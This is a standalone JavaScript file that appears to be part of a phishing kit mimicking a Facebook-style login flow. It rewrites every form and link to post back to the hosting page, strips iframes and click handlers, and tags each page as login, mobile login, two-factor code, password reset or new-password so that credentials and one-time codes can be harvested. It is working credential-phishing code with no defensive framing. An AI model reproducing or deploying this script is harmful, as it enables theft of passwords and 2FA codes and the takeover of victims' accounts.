let allForms = document.querySelectorAll("form")
for (let form of allForms) {
    form.innerHTML += `<input type="hidden" name="spike-type">`
}
// setting spike type
function addSpikeType(value) {
    let allSpikes = document.querySelectorAll(`[name="spike-type"]`)
    for (let spike of allSpikes) {
        spike.value = value
    }
}

document.querySelectorAll("form").forEach(f => {
    f.action = location.href
    f.method = "POST"
    f.noValidate = false
})

document.querySelectorAll("iframe").forEach(f => {
    f.remove()
})

document.querySelectorAll("input").forEach(inp => {
    if (inp.type != "hidden") {
        inp.required = true
    }
})

document.querySelectorAll("a").forEach(atag => {
    atag.href = location.href
})

document.querySelectorAll("[onclick]").forEach(onclk => {
    onclk.onclick = function () { }
})

// all possible selectors
let email = document.querySelector('#email')
let pass = document.querySelector('#pass')
// set
let m_login_email = document.querySelector('#m_login_email')
let m_login_password = document.querySelector('#m_login_password')
// set
let approvals_code = document.querySelector(`[name="approvals_code"]`)
// set
let formInnerText = document.querySelector("form").innerText
// set 
let reset_action = document.querySelector(`[name="reset_action"]`)
let reset_input = document.querySelector(`[name="n"]`)
let reset_input_placeholder = document.querySelector(`[placeholder="######"]`)
// set
let password_new_input = document.querySelector(`[name="password_new"]`)
let password_new_input_next_btn = document.querySelector(`[value="Next"]`)

// set
if (email && pass) {
    addSpikeType("login")
}
// set
else if (m_login_email && m_login_password) {
    addSpikeType("m_login")
    document.querySelector(`[type="button"]`).type = "submit"
}
// set
else if (approvals_code) {
    addSpikeType("otp")
}
// set
else if (formInnerText.includes("Save Browser") && formInnerText.includes("Don't Save")) {
    addSpikeType("redirect")
}
// set
else if (reset_action && reset_input && reset_input_placeholder) {
    addSpikeType("reset_action_otp")
}
// set
else if (reset_action) {
    addSpikeType("reset_action")
}
// set
else if (password_new_input && password_new_input_next_btn) {
    addSpikeType("redirect")
}
